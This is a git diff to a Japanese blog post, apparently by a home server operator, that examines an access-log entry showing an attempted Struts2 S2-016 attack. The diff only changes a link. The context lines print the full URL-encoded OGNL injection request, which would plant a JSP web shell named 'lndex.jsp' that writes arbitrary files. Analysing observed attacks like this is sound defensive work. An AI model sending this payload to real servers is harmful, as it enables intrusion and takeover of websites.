@@ -6,7 +6,7 @@ tags: [apache, access_log, java, Struts2, S2-016]
 description: 自宅サーバで動かしているApacheに対してStruts2の脆弱性「S2-016」を悪用しようとする攻撃が来ていたので、その内容を調べてみました。
 ---
 
-さっきの[apache killerの話](http://blanktar.jp/blog/2015/07/python-make-apache-killer.html)を書いたあとでapacheのアクセスログを見ていたら、こんなアクセスが。
+さっきの[apache killerの話](/blog/2015/07/python-make-apache-killer)を書いたあとでapacheのアクセスログを見ていたら、こんなアクセスが。
 ```
 xx.xx.xx.xx [01/Jul/2015:03:09:11 +0900] "GET /index.php?redirect:$%%7b%%2523req%%253d%%2523context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%%2523res%%253d%%2523context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%%2523res.getWriter().println(%%2522okokok%%2522),%%2523res.getWriter().flush(),%%2523res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%%2523req.getRealPath(%%2522/%%2522)%%252b%%2522lndex.jsp%%2522)).append(%%2523req.getParameter(%%2522shell%%2522)).close()%%7d&shell=%%253C%%2525if(request.getParameter(%%2522f%%2522)!%%253Dnull)(new%%2520java.io.FileOutputStream(application.getRealPath(%%2522%%252F%%2522)%%252Brequest.getParameter(%%2522f%%2522))).write(request.getParameter(%%2522t%%2522).getBytes())%%253B%%2525%%253E%%253Ca%%2520href%%253D%%2522One_OK%%2522%%253E%%253C%%252Fa%%253E HTTP/1.1" 404 2583 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"
 ```
